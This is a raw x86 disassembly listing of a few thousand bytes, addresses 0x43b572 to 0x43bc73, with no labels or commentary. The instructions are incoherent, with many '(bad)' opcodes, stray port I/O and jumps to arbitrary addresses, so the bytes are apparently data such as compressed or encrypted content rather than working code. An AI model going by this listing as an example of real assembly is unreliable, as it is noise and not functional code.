  43b572:	add    DWORD PTR [ecx+0x1a14f13f],esp
  43b578:	xchg   DWORD PTR [esi+0x6b5bdd40],ecx
  43b57e:	fcmovbe st,st(5)
  43b580:	loopne 0x43b5eb
  43b582:	dec    esi
  43b583:	pop    esi
  43b584:	jmp    0xfe5595f
  43b589:	mov    dl,BYTE PTR [eax+0xa85289e]
  43b58f:	inc    eax
  43b590:	pusha  
  43b591:	dec    esi
  43b592:	lahf   
  43b593:	mov    esi,0x211fc520
  43b598:	add    DWORD PTR [ecx+0x60a65395],0x26
  43b59f:	sub    eax,0x46dad2c7
  43b5a4:	sbb    DWORD PTR [ebp-0x14],ebp
  43b5a7:	(bad)  
  43b5a8:	pop    edi
  43b5a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b5aa:	jne    0x43b603
  43b5ac:	out    0x1d,eax
  43b5ae:	push   esi
  43b5af:	sbb    DWORD PTR [ecx-0x775e91a5],0x79b58854
  43b5b9:	retf   0x731
  43b5bc:	pop    esi
  43b5bd:	retf   0xd605
  43b5c0:	push   ds
  43b5c1:	push   ebx
  43b5c2:	adc    DWORD PTR [ebx+0x680d60e2],edx
  43b5c8:	sbb    DWORD PTR [ecx],eax
  43b5ca:	push   esi
  43b5cb:	out    dx,eax
  43b5cc:	xor    BYTE PTR [esi-0x12],al
  43b5cf:	jne    0x43b5f9
  43b5d1:	or     al,0x51
  43b5d3:	mov    dl,0x73
  43b5d5:	repz data16 test al,0x89
  43b5d9:	and    bl,bh
  43b5db:	popa   
  43b5dc:	imul   eax,eax,0xa
  43b5df:	jg     0x43b5be
  43b5e1:	popf   
  43b5e2:	out    dx,al
  43b5e3:	push   esi
  43b5e4:	(bad)  
  43b5e6:	xchg   ebx,eax
  43b5e7:	call   FWORD PTR [si]
  43b5ea:	push   ss
  43b5eb:	cwde   
  43b5ec:	cmp    DWORD PTR [ebx+0x76e3a0d2],edi
  43b5f2:	mov    ebx,0xeee27175
  43b5f7:	adc    BYTE PTR [ebp+0x7d],0xbc
  43b5fb:	aad    0x68
  43b5fd:	mov    ds:0x6f0a0ea,eax
  43b602:	sbb    ebp,ecx
  43b604:	gs dec esp
  43b606:	sub    edi,ebx
  43b608:	cmp    bl,bh
  43b60a:	outs   dx,DWORD PTR ds:[esi]
  43b60b:	stos   DWORD PTR es:[edi],eax
  43b60c:	fstp   QWORD PTR [ebp+0x31]
  43b60f:	test   al,0x38
  43b611:	mov    ds:0x44c17949,al
  43b616:	into   
  43b617:	mov    al,ds:0x7cf87251
  43b61c:	jno    0x43b667
  43b61e:	adc    ecx,edx
  43b620:	pop    edi
  43b621:	jle    0x43b630
  43b623:	adc    BYTE PTR [ecx],ch
  43b625:	retf   0x11a5
  43b628:	test   al,0x1f
  43b62a:	aad    0xf0
  43b62c:	or     ah,BYTE PTR [ecx-0x5f]
  43b62f:	retf   
  43b630:	lahf   
  43b631:	mov    es,WORD PTR [edx-0x7f]
  43b634:	mov    ah,0xc4
  43b636:	out    dx,al
  43b637:	les    ecx,FWORD PTR es:[ecx-0x5]
  43b63b:	inc    ebx
  43b63c:	stos   DWORD PTR es:[edi],eax
  43b63d:	test   eax,0x466da133
  43b642:	dec    edi
  43b643:	pop    ss
  43b644:	clc    
  43b645:	mov    al,0x56
  43b647:	test   BYTE PTR [edx],bh
  43b649:	sahf   
  43b64a:	fimul  DWORD PTR [ebp+0x5b]
  43b64d:	stc    
  43b64e:	sbb    edi,DWORD PTR [eax]
  43b650:	push   cs
  43b651:	jl     0x43b696
  43b653:	shl    BYTE PTR [edx+0x6b72f060],1
  43b659:	imul   ebx,DWORD PTR [edi],0x6
  43b65c:	inc    eax
  43b65d:	inc    ebp
  43b65e:	cld    
  43b65f:	jo     0x43b6d6
  43b661:	sbb    al,0xee
  43b663:	mov    eax,ds:0x7ed569f2
  43b668:	popaw  
  43b66a:	and    dh,BYTE PTR [eax+edi*4]
  43b66d:	ret    
  43b66e:	out    0xfc,al
  43b670:	cwde   
  43b671:	mov    ecx,0x7f9067ee
  43b676:	pushf  
  43b677:	mov    WORD PTR [ecx+ebx*8+0xa],gs
  43b67b:	mov    eax,ds:0x57e83ffa
  43b680:	or     eax,0x5d146638
  43b685:	sub    al,0xcf
  43b687:	xchg   ecx,eax
  43b688:	xor    BYTE PTR [edx],bl
  43b68a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b68b:	fs jp  0x43b700
  43b68e:	shl    BYTE PTR [eax-0x3cd9ea22],0x9d
  43b695:	mov    eax,ds:0xaa5e8084
  43b69a:	mov    ebp,eax
  43b69c:	mov    esi,0xc6382190
  43b6a1:	pusha  
  43b6a2:	stc    
  43b6a3:	sbb    BYTE PTR [ecx],bl
  43b6a5:	in     eax,dx
  43b6a6:	dec    esp
  43b6a7:	adc    BYTE PTR [esi],cl
  43b6a9:	fsubp  st(6),st
  43b6ab:	xchg   BYTE PTR [edx-0x4e8f99e4],dh
  43b6b1:	inc    eax
  43b6b2:	(bad)  
  43b6b3:	(bad)  
  43b6b4:	fidivr WORD PTR ds:0xbfb36168
  43b6ba:	xor    bh,BYTE PTR [ecx]
  43b6bc:	int3   
  43b6bd:	xchg   esi,ebp
  43b6bf:	sbb    eax,0x7338d0d
  43b6c4:	test   al,0x49
  43b6c6:	stos   BYTE PTR es:[edi],al
  43b6c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b6c8:	in     eax,0x4c
  43b6ca:	sub    edx,0xe33b2121
  43b6d0:	jg     0x43b71a
  43b6d2:	out    dx,al
  43b6d3:	and    bl,bh
  43b6d5:	in     eax,dx
  43b6d6:	stos   DWORD PTR es:[edi],eax
  43b6d7:	sbb    al,0xc0
  43b6d9:	outs   dx,DWORD PTR ds:[esi]
  43b6da:	cmc    
  43b6db:	mov    al,ds:0x9322df80
  43b6e0:	adc    bl,dh
  43b6e2:	retf   0x6053
  43b6e5:	dec    esi
  43b6e6:	and    eax,0x50b7c94b
  43b6eb:	add    DWORD PTR [esi+0x5aa924bd],eax
  43b6f1:	mov    al,0x6e
  43b6f3:	je     0x43b755
  43b6f5:	sbb    BYTE PTR [eax+0xf],bl
  43b6f8:	pop    ds
  43b6f9:	add    al,0xee
  43b6fb:	jge    0x43b740
  43b6fd:	mov    al,ds:0xd9623d07
  43b702:	or     eax,0x594791a1
  43b707:	mov    bh,0xb2
  43b709:	fisub  DWORD PTR [edx+0x2a]
  43b70c:	jbe    0x43b75a
  43b70e:	in     eax,dx
  43b70f:	sbb    ecx,DWORD PTR ds:0x1e0d0c3b
  43b715:	outs   dx,DWORD PTR ds:[esi]
  43b716:	push   edx
  43b717:	dec    ecx
  43b718:	clc    
  43b719:	pop    ecx
  43b71a:	hlt    
  43b71b:	xchg   esi,eax
  43b71c:	repz adc eax,0xffffffee
  43b720:	gs pop ebx
  43b722:	outs   dx,BYTE PTR ds:[esi]
  43b723:	ror    DWORD PTR [ecx],0x29
  43b726:	sub    esi,esp
  43b728:	pop    esi
  43b729:	pop    edx
  43b72a:	lock ret 
  43b72c:	sub    DWORD PTR [esi+0x60704485],eax
  43b732:	jl     0x43b791
  43b734:	xor    dl,BYTE PTR [edi+0x7b]
  43b737:	mov    al,0xd2
  43b739:	repz (bad) 
  43b73b:	in     al,dx
  43b73c:	jl     0x43b70d
  43b73e:	push   0x4040167e
  43b743:	mov    eax,ds:0xa2445483
  43b748:	out    dx,al
  43b749:	push   es
  43b74a:	fst    QWORD PTR [eax+0x42043f5e]
  43b750:	adc    DWORD PTR [ecx+0x6133cebe],esp
  43b756:	add    cl,ch
  43b758:	rol    DWORD PTR [ebp-0x72],1
  43b75b:	lock popf 
  43b75d:	gs out dx,al
  43b75f:	pop    ebx
  43b760:	test   DWORD PTR [ecx+0x1d],ecx
  43b763:	mov    edi,0xa0ffb8e3
  43b768:	adc    cl,dl
  43b76a:	and    eax,0xa676c73f
  43b76f:	stos   DWORD PTR es:[edi],eax
  43b770:	pop    esi
  43b771:	mov    al,ds:0xe0cdf20b
  43b776:	mov    eax,0x5d5da221
  43b77b:	ins    DWORD PTR es:[edi],dx
  43b77c:	hlt    
  43b77d:	enter  0x30a8,0xa6
  43b781:	ret    
  43b782:	mov    bl,0x44
  43b784:	pop    esi
  43b785:	js     0x43b755
  43b787:	xchg   edi,eax
  43b788:	adc    BYTE PTR [ebx-0xf],cl
  43b78b:	pop    ds
  43b78c:	inc    esi
  43b78d:	popa   
  43b78e:	jg     0x43b760
  43b790:	pop    ecx
  43b791:	or     BYTE PTR ds:0x26039e6f,bl
  43b797:	and    edi,DWORD PTR [eax+eiz*8+0x2a]
  43b79b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b79c:	ret    
  43b79d:	fs cmc 
  43b79f:	lea    ebp,[esi+0x60]
  43b7a2:	dec    ecx
  43b7a3:	nop
  43b7a4:	and    esi,DWORD PTR [esi+0x194bcdb3]
  43b7aa:	out    dx,al
  43b7ab:	and    ecx,DWORD PTR [edx+0x54f5fbfc]
  43b7b1:	jp     0x43b825
  43b7b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b7b4:	lock jb 0x43b7ab
  43b7b7:	(bad)
  43b7ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b7bc:	add    BYTE PTR [eax-0x15],bh
  43b7bf:	mov    edi,0xc0e5a5b7
  43b7c4:	pop    ecx
  43b7c5:	rcl    DWORD PTR [esi+0x2a5da198],0xa9
  43b7cc:	in     eax,0x6
  43b7ce:	push   ebp
  43b7cf:	out    0xc7,eax
  43b7d1:	inc    ebp
  43b7d2:	pop    edi
  43b7d3:	xor    ecx,esp
  43b7d5:	mov    edx,0x305e9732
  43b7da:	cwde   
  43b7db:	jmp    0x6ce8927a
  43b7e0:	daa    
  43b7e1:	push   ebx
  43b7e2:	dec    esp
  43b7e3:	add    eax,DWORD PTR [edx-0x20]
  43b7e6:	dec    esi
  43b7e7:	not    BYTE PTR [edi+0x5e5149f6]
  43b7ed:	push   esp
  43b7ee:	lods   al,BYTE PTR ds:[esi]
  43b7ef:	inc    ecx
  43b7f0:	fwait
  43b7f1:	mov    BYTE PTR gs:[esp+ecx*4-0x303ee9a0],dh
  43b7f9:	loop   0x43b7e8
  43b7fb:	cmp    bh,BYTE PTR [ecx+esi*1-0x1]
  43b7ff:	into   
  43b800:	(bad)  
  43b801:	adc    DWORD PTR [esi-0x52],ebp
  43b804:	mov    ds:0xc96bbb24,eax
  43b809:	push   edx
  43b80a:	cmc    
  43b80b:	shl    bh,cl
  43b80d:	fucomp st(3)
  43b80f:	xor    ebx,DWORD PTR es:[ebp-0x7a]
  43b813:	mov    WORD PTR [esi],?
  43b815:	das    
  43b816:	out    dx,al
  43b817:	or     eax,0xf522a249
  43b81c:	aad    0xe3
  43b81e:	jg     0x43b80f
  43b820:	sahf   
  43b821:	pusha  
  43b822:	cmp    eax,0xaeeebb50
  43b827:	xor    al,0x5b
  43b829:	lods   eax,DWORD PTR ds:[esi]
  43b82a:	in     eax,dx
  43b82b:	mov    gs,WORD PTR [ebp+0x209c2384]
  43b831:	add    al,0x5e
  43b833:	cmp    al,0xe7
  43b835:	pusha  
  43b836:	nop    DWORD PTR [esp+ecx*8+0x4885471f]
  43b83e:	out    dx,al
  43b83f:	ja     0x43b7e5
  43b841:	test   edi,edx
  43b843:	mov    eax,ds:0xa10323a7
  43b848:	jb     0x43b8ac
  43b84a:	xor    ebx,esp
  43b84c:	cmc    
  43b84d:	in     al,0xcb
  43b84f:	xchg   DWORD PTR [esi+0x77],ebx
  43b852:	fidiv  WORD PTR [esi+eax*8]
  43b855:	push   esi
  43b856:	das    
  43b857:	pop    ebx
  43b858:	inc    ecx
  43b859:	inc    edx
  43b85a:	mov    esp,0xee292886
  43b85f:	adc    ah,BYTE PTR [ecx+0x33]
  43b862:	xor    dl,BYTE PTR [edx+0x66eb8b51]
  43b868:	xchg   esi,eax
  43b869:	popf   
  43b86a:	imul   esp,DWORD PTR [edi+0x327d8ec],0xcb896122
  43b874:	mov    esp,0x408918ae
  43b879:	mov    dh,0x60
  43b87b:	sbb    eax,0x43360a5e
  43b880:	imul   ecx,DWORD PTR [ecx+0x30fb2cad],0xa545a3dc
  43b88a:	xlat   BYTE PTR ds:[ebx]
  43b88b:	lea    esp,[eax]
  43b88d:	es popw es
  43b890:	ror    DWORD PTR [esi-0x32132a12],1
  43b896:	ror    DWORD PTR [ebp+0x1b],0xb8
  43b89a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b89b:	mov    eax,ds:0x225aaae4
  43b8a0:	pusha  
  43b8a1:	jb     0x43b882
  43b8a3:	sti    
  43b8a4:	cmp    bh,BYTE PTR [edx+0x5e]
  43b8a7:	std    
  43b8a8:	pop    esi
  43b8a9:	sub    dh,BYTE PTR [edx+0x6a]
  43b8ac:	popa   
  43b8ad:	repnz push ebp
  43b8af:	in     eax,dx
  43b8b0:	int    0x60
  43b8b2:	add    ebx,DWORD PTR [esp+eax*2]
  43b8b5:	cmp    dl,BYTE PTR [edi]
  43b8b7:	and    BYTE PTR [esi],0xb0
  43b8ba:	adc    ah,BYTE PTR [edx-0x5edcd57c]
  43b8c0:	enter  0x8b43,0x8b
  43b8c4:	and    ch,BYTE PTR [eax-0x69]
  43b8c7:	ins    DWORD PTR es:[edi],dx
  43b8c8:	jns    0x43b8ed
  43b8ca:	lods   eax,DWORD PTR ds:[esi]
  43b8cb:	mov    al,ds:0x6b8607b7
  43b8d0:	pop    edx
  43b8d1:	mov    esi,0xc1370570
  43b8d6:	xchg   DWORD PTR [eax],edx
  43b8d8:	sub    ebp,DWORD PTR [esi+0x6e]
  43b8db:	pop    ebx
  43b8dc:	dec    ecx
  43b8dd:	int    0xe5
  43b8df:	fs push esp
  43b8e1:	mov    ch,0x60
  43b8e3:	mov    eax,ds:0xfd06050f
  43b8e8:	mov    al,bl
  43b8ea:	out    dx,eax
  43b8eb:	xor    bl,BYTE PTR [esi+0x50]
  43b8ee:	in     eax,dx
  43b8ef:	pop    esp
  43b8f0:	mov    bl,0x28
  43b8f2:	dec    ebx
  43b8f3:	pop    edi
  43b8f4:	nop
  43b8f5:	pusha  
  43b8f6:	inc    ecx
  43b8f7:	add    edx,DWORD PTR [esi-0x33]
  43b8fa:	mov    dl,0x15
  43b8fc:	mov    bh,0x82
  43b8fe:	out    dx,al
  43b8ff:	ret    
  43b900:	jmp    0x43b8dd
  43b902:	repz sti 
  43b904:	adc    eax,0x6ba1753d
  43b909:	pop    cx
  43b90b:	or     eax,0x869f633b
  43b910:	pop    esi
  43b911:	cmp    DWORD PTR [edx-0x7481f75e],0x76b882df
  43b91b:	xor    DWORD PTR [edi],edx
  43b91d:	arpl   cx,dx
  43b91f:	mov    ds:0x2d56385e,eax
  43b924:	xor    bh,0x41
  43b927:	pop    esp
  43b928:	pop    esi
  43b929:	inc    esi
  43b92a:	ins    BYTE PTR es:[edi],dx
  43b92b:	inc    esp
  43b92c:	mov    WORD PTR ds:0x526df77c,fs
  43b932:	test   bl,ah
  43b934:	fs stc 
  43b936:	lods   eax,DWORD PTR ds:[esi]
  43b937:	sub    eax,0xb139fa1d
  43b93c:	jmp    0xd16e:0xebe8eea4
  43b943:	imul   ebx,edx,0xffffff95
  43b946:	sbb    DWORD PTR [ecx+0x396be7ed],esp
  43b94c:	mov    bl,0x1b
  43b94e:	int    0xe0
  43b950:	arpl   si,ax
  43b952:	sar    dh,cl
  43b954:	adc    cl,al
  43b956:	dec    ebx
  43b957:	lds    esi,FWORD PTR [edi+0x12a19c56]
  43b95d:	stos   BYTE PTR es:[edi],al
  43b95e:	xchg   ebp,eax
  43b95f:	(bad)  
  43b960:	(bad)  
  43b962:	sahf   
  43b963:	ja     0x43b9b5
  43b965:	adc    eax,0xd74ca99d
  43b96a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b96b:	mov    eax,ds:0x358ff437
  43b970:	ret    0xee3e
  43b973:	pop    ss
  43b974:	or     bh,BYTE PTR [esi]
  43b976:	lods   eax,DWORD PTR ds:[esi]
  43b977:	or     al,0x71
  43b979:	jle    0x43b960
  43b97b:	sbb    BYTE PTR [ebp+0x59aa4460],0xe3
  43b982:	adc    ch,al
  43b984:	xor    BYTE PTR [edx],cl
  43b986:	out    dx,al
  43b987:	sbb    BYTE PTR [ecx+0x11],cl
  43b98a:	lea    ecx,[esi-0x7c]
  43b98d:	out    dx,al
  43b98e:	sahf   
  43b98f:	cli    
  43b990:	cmp    eax,0x8d0eb53
  43b995:	cmc    
  43b996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b997:	(bad)  
  43b998:	arpl   WORD PTR [edx],bx
  43b99a:	jmp    0x43b948
  43b99c:	adc    esi,DWORD PTR [edx]
  43b99e:	(bad)  
  43b99f:	fs scas eax,DWORD PTR es:[edi]
  43b9a1:	call   0xb1a2f2ec
  43b9a6:	imul   esp,DWORD PTR [ecx-0x2799c741],0x867603f2
  43b9b0:	pop    esi
  43b9b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b9b2:	call   0xa390:0x7de1e32d
  43b9b9:	pusha  
  43b9ba:	sbb    BYTE PTR ds:0x3410c767,ah
  43b9c0:	or     ch,BYTE PTR [edi+0x2eeb4fee]
  43b9c6:	xchg   DWORD PTR [ecx+0x52],ebx
  43b9c9:	cld    
  43b9ca:	dec    ecx
  43b9cb:	nop
  43b9cc:	bound  eax,QWORD PTR [ecx+0x72]
  43b9cf:	in     al,dx
  43b9d0:	fisub  WORD PTR [ebx-0x18]
  43b9d3:	jno    0x43b9e7
  43b9d5:	xchg   edx,eax
  43b9d6:	dec    ebp
  43b9d7:	xchg   edx,eax
  43b9d8:	pop    esi
  43b9d9:	xchg   DWORD PTR [ecx+0x7bf102be],edi
  43b9df:	daa    
  43b9e0:	and    al,0x60
  43b9e2:	dec    edx
  43b9e3:	in     eax,dx
  43b9e4:	test   WORD PTR [ebx+ecx*8-0x1ea58fea],dx
  43b9ec:	stc    
  43b9ed:	and    WORD PTR [esi+ebx*2],ax
  43b9f1:	xchg   edi,eax
  43b9f2:	call   DWORD PTR [edi]
  43b9f4:	push   edx
  43b9f5:	dec    edi
  43b9f6:	push   es
  43b9f7:	xchg   dl,dh
  43b9f9:	and    edi,ebp
  43b9fb:	mov    al,ds:0xbce4b19b
  43ba00:	pop    es
  43ba01:	xchg   edx,eax
  43ba02:	mov    al,ds:0x26e5e6b
  43ba07:	push   ebp
  43ba08:	inc    ebp
  43ba09:	es xchg edi,eax
  43ba0b:	data16 and al,BYTE PTR [ebp-0xc]
  43ba0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ba10:	jle    0x43ba66
  43ba12:	push   ecx
  43ba13:	daa    
  43ba14:	into   
  43ba15:	adc    dh,ch
  43ba17:	cli    
  43ba18:	sbb    eax,0xf12fd6a8
  43ba1d:	int3   
  43ba1e:	scas   eax,DWORD PTR es:[edi]
  43ba1f:	mov    eax,ds:0x3845edf6
  43ba24:	adc    eax,0xbc21a92f
  43ba29:	sti    
  43ba2a:	xlat   BYTE PTR ds:[ebx]
  43ba2b:	xchg   cl,bh
  43ba2d:	js     0x43ba5e
  43ba2f:	adc    DWORD PTR [edi+ebx*4],edi
  43ba32:	cwde   
  43ba33:	mov    eax,ds:0x59521a6d
  43ba38:	(bad)  
  43ba39:	push   cs
  43ba3a:	arpl   bx,bp
  43ba3c:	pop    esi
  43ba3d:	sbb    BYTE PTR [edi],bl
  43ba3f:	(bad)  
  43ba40:	js     0x43b9fd
  43ba42:	out    0x6f,eax
  43ba44:	xchg   edi,eax
  43ba45:	pusha  
  43ba46:	fcom   QWORD PTR ds:0xf4ffbd11
  43ba4c:	xchg   ecx,eax
  43ba4d:	xchg   dh,ch
  43ba4f:	pop    es
  43ba50:	in     al,0xa9
  43ba52:	stc    
  43ba53:	jg     0x43ba9c
  43ba55:	inc    eax
  43ba56:	xchg   ecx,eax
  43ba57:	(bad)  
  43ba58:	fcmovnu st,st(4)
  43ba5a:	fsubr  st(0),st
  43ba5c:	sbb    ebx,ebx
  43ba5e:	cli    
  43ba5f:	in     eax,dx
  43ba60:	pop    edi
  43ba62:	or     BYTE PTR [eax-0x66],dl
  43ba65:	jl     0x43ba54
  43ba67:	mov    esi,0xd523cff6
  43ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ba6d:	sbb    al,0x8d
  43ba6f:	nop
  43ba70:	and    dl,bh
  43ba72:	pop    ds
  43ba73:	mov    eax,ds:0xa2a7533f
  43ba78:	mov    dh,0xaf
  43ba7a:	out    dx,al
  43ba7b:	push   0xf66f89d9
  43ba80:	mov    cl,0xc8
  43ba82:	inc    ecx
  43ba83:	out    dx,al
  43ba84:	inc    ebp
  43ba85:	popa   
  43ba86:	and    ecx,DWORD PTR [edx+ebp*4+0x6ea84887]
  43ba8d:	inc    edx
  43ba8e:	dec    esi
  43ba8f:	pop    es
  43ba90:	arpl   WORD PTR [ebx-0x1],di
  43ba93:	pop    edx
  43ba94:	or     al,0xc1
  43ba96:	adc    al,0x48
  43ba98:	lock jmp 0xcb9b5bb5
  43ba9e:	pop    esi
  43ba9f:	(bad)  
  43baa0:	out    0xd4,al
  43baa2:	cdq    
  43baa3:	out    dx,eax
  43baa4:	pop    esi
  43baa5:	push   edi
  43baa6:	sbb    bl,BYTE PTR [ebx+eax*4+0x4bdc3137]
  43baad:	mov    bl,0xef
  43baaf:	ins    BYTE PTR es:[edi],dx
  43bab0:	iret   
  43bab1:	inc    esp
  43bab2:	jp     0x43babc
  43bab4:	pop    ebp
  43bab5:	loope  0x43bb33
  43bab7:	mov    esp,DWORD PTR [ebx]
  43bab9:	(bad)  
  43baba:	xlat   BYTE PTR ds:[ebx]
  43babb:	pop    ebp
  43babc:	pop    esi
  43babd:	ror    esi,0x5a
  43bac0:	push   ebp
  43bac1:	stc    
  43bac2:	mov    ch,0x6e
  43bac4:	sub    al,0x61
  43bac6:	mov    cl,0x4e
  43bac8:	xor    bh,BYTE PTR [eax-0x26]
  43bacb:	add    dl,BYTE PTR [ebx-0x1d]
  43bace:	jmp    FWORD PTR [eax]
  43bad0:	pop    eax
  43bad1:	test   dh,ch
  43bad3:	pop    ss
  43bad4:	fnop   
  43bad6:	aaa    
  43bad7:	iret   
  43bad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bad9:	pusha  
  43bada:	pusha  
  43badb:	arpl   WORD PTR [ebx],sp
  43badd:	jae    0x43babc
  43badf:	push   cs
  43bae0:	pop    edx
  43bae1:	ins    BYTE PTR es:[edi],dx
  43bae2:	pop    edx
  43bae3:	in     al,0x42
  43bae5:	fs push ebx
  43bae7:	cli    
  43bae8:	pop    edx
  43bae9:	lock adc edx,edi
  43baec:	sahf   
  43baed:	pop    ecx
  43baee:	in     al,dx
  43baef:	stos   DWORD PTR es:[edi],eax
  43baf0:	jo     0x43bb54
  43baf2:	lea    ebx,[edx+0xefba0de]
  43baf8:	(bad)  
  43baf9:	in     eax,dx
  43bafa:	and    bh,bl
  43bafc:	pop    ebp
  43bafd:	sbb    al,0x7
  43baff:	je     0x43bb4d
  43bb01:	push   es
  43bb02:	push   esi
  43bb03:	xor    DWORD PTR [edx-0x4d],ebp
  43bb06:	mov    ebx,DWORD PTR [edi-0x392189f0]
  43bb0c:	push   ds
  43bb0d:	test   BYTE PTR [edx],bh
  43bb0f:	not    al
  43bb11:	ret    0x8eee
  43bb14:	add    al,0x6f
  43bb16:	inc    ebp
  43bb17:	mov    ah,0x94
  43bb19:	push   ds
  43bb1a:	nop
  43bb1b:	mov    eax,ds:0xfd0b593e
  43bb20:	int    0x3b
  43bb22:	imul   ebp,edi,0x31
  43bb25:	cdq    
  43bb26:	sub    DWORD PTR [ecx],0xfe9b5183
  43bb2c:	addr16 mov al,ds:0x1721
  43bb30:	mov    ecx,0x128f3ecf
  43bb35:	popa   
  43bb36:	in     al,dx
  43bb37:	adc    BYTE PTR [esi+0x440bbc9e],bh
  43bb3d:	ret    0x222
  43bb40:	adc    edx,eax
  43bb42:	lahf   
  43bb43:	xchg   esi,ebx
  43bb45:	xor    dh,cl
  43bb47:	sub    al,0xef
  43bb49:	fs (bad) 
  43bb4b:	lea    esp,[edx]
  43bb4d:	push   ds
  43bb4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bb4f:	ins    DWORD PTR es:[edi],dx
  43bb50:	pop    esi
  43bb51:	mov    ?,WORD PTR [edx-0x3f]
  43bb54:	stos   DWORD PTR es:[edi],eax
  43bb55:	fcomp  DWORD PTR [ebp-0x2]
  43bb58:	xor    bl,BYTE PTR [edx-0x6d]
  43bb5b:	mov    eax,ds:0x66152e6f
  43bb60:	mov    al,ds:0x7baa8e37
  43bb65:	mov    cl,0x73
  43bb67:	fsub   DWORD PTR [esi+0x50]
  43bb6a:	out    dx,al
  43bb6b:	es push ds
  43bb6d:	loop   0x43bbce
  43bb6f:	outs   dx,BYTE PTR ds:[esi]
  43bb70:	pop    ebp
  43bb71:	push   esi
  43bb72:	loope  0x43bafe
  43bb74:	adc    BYTE PTR [esi+0x506ea5d6],ch
  43bb7a:	pop    esi
  43bb7b:	mov    ebp,0xa18bcae8
  43bb80:	jle    0x43bb3d
  43bb82:	sub    DWORD PTR [eax+0x25],esp
  43bb85:	cmp    ebx,ecx
  43bb87:	mov    ebx,DWORD PTR [esi+0x26]
  43bb8a:	shl    dl,cl
  43bb8c:	(bad)  
  43bb8d:	clc    
  43bb8e:	jg     0x43bb80
  43bb90:	mov    ebx,0xe6d0cc60
  43bb95:	scas   al,BYTE PTR es:[edi]
  43bb96:	cmp    bl,bl
  43bb98:	mov    eax,DWORD PTR [eax]
  43bb9a:	and    DWORD PTR [edx+0xa],edi
  43bb9d:	pusha  
  43bb9e:	xchg   ecx,eax
  43bb9f:	cmp    eax,0x5f75a926
  43bba4:	popf   
  43bba5:	sahf   
  43bba6:	push   edx
  43bba7:	test   eax,0x46e3612f
  43bbac:	data16 mov bh,0xba
  43bbaf:	lock and ch,ch
  43bbb2:	or     al,dl
  43bbb4:	sahf   
  43bbb5:	scas   eax,DWORD PTR es:[edi]
  43bbb6:	out    dx,al
  43bbb7:	mov    edx,0xfd7cff2b
  43bbbc:	fisub  DWORD PTR [eax+0x2d]
  43bbbf:	sub    BYTE PTR [ebx+0x1c],al
  43bbc2:	jmp    0x43bbc9
  43bbc4:	call   0x5e9096e9
  43bbc9:	dec    esp
  43bbca:	mov    dl,0x17
  43bbcc:	ins    DWORD PTR es:[edi],dx
  43bbcd:	mov    ds:0x60fbba2b,al
  43bbd2:	cmc    
  43bbd3:	pop    esi
  43bbd4:	jne    0x43bc4c
  43bbd6:	mov    ah,0x18
  43bbd8:	neg    BYTE PTR [ebp-0x12]
  43bbdb:	and    edi,DWORD PTR [esp]
  43bbde:	sbb    ebp,DWORD PTR [ecx-0x4e]
  43bbe1:	pop    esp
  43bbe2:	clc    
  43bbe3:	mov    al,ds:0xa368b4e4
  43bbe8:	fld    DWORD PTR [eax]
  43bbea:	push   es
  43bbeb:	(bad)  
  43bbec:	pop    esi
  43bbed:	adc    BYTE PTR [edx-0x54745f29],cl
  43bbf3:	or     al,0x8c
  43bbf5:	pusha  
  43bbf6:	cld    
  43bbf7:	scas   al,BYTE PTR es:[edi]
  43bbf8:	pop    ebp
  43bbf9:	inc    ebx
  43bbfa:	loop   0x43bba8
  43bbfc:	cld    
  43bbfd:	jb     0x43bbe4
  43bbff:	int3   
  43bc00:	pop    esi
  43bc01:	mov    ah,BYTE PTR [esi+0x36]
  43bc04:	sub    bh,BYTE PTR es:[esi]
  43bc07:	fistp  QWORD PTR [eax+eiz*2-0x5]
  43bc0b:	dec    ebp
  43bc0c:	xchg   ebx,eax
  43bc0d:	int    0x35
  43bc0f:	neg    DWORD PTR [edi+edi*8-0x3f6a2e19]
  43bc16:	bound  eax,QWORD PTR [esi]
  43bc18:	(bad)  
  43bc19:	std    
  43bc1a:	sub    bh,BYTE PTR [edi+0x51]
  43bc1d:	pop    esi
  43bc1e:	les    ebx,FWORD PTR [esp+ebx*2+0x72]
  43bc22:	imul   eax,ecx,0x7545b6bd
  43bc28:	popa   
  43bc29:	nop
  43bc2a:	loopne 0x43bc47
  43bc2c:	xor    bl,BYTE PTR [edi-0x52]
  43bc2f:	daa    
  43bc30:	xor    al,0x46
  43bc32:	push   edi
  43bc33:	adc    al,0xee
  43bc35:	adc    BYTE PTR [edi],dh
  43bc37:	fs call 0xfaf6:0x8d3ee060
  43bc3f:	dec    eax
  43bc40:	mov    ch,0xd6
  43bc42:	out    dx,al
  43bc43:	out    dx,eax
  43bc44:	rol    DWORD PTR [edi],1
  43bc46:	out    0xad,eax
  43bc48:	sub    eax,ecx
  43bc4a:	aaa    
  43bc4b:	(bad)  
  43bc4c:	div    DWORD PTR [edi]
  43bc4e:	outs   dx,BYTE PTR ds:[esi]
  43bc4f:	and    DWORD PTR [edx],eax
  43bc51:	iret   
  43bc52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bc53:	sti    
  43bc54:	pop    edx
  43bc55:	mov    ds:0x2b3f7ded,eax
  43bc5a:	fwait
  43bc5b:	mov    bl,0x3b
  43bc5d:	in     al,dx
  43bc5e:	bound  eax,QWORD PTR [eax-0x11d69ec7]
  43bc64:	sahf   
  43bc65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bc66:	dec    eax
  43bc67:	bound  edx,QWORD PTR [ecx-0x13]
  43bc6a:	dec    edx
  43bc6b:	es pop ebp
  43bc6d:	sub    eax,DWORD PTR ds:0xa4c68fe6
  43bc73:	loope  0x43bce8
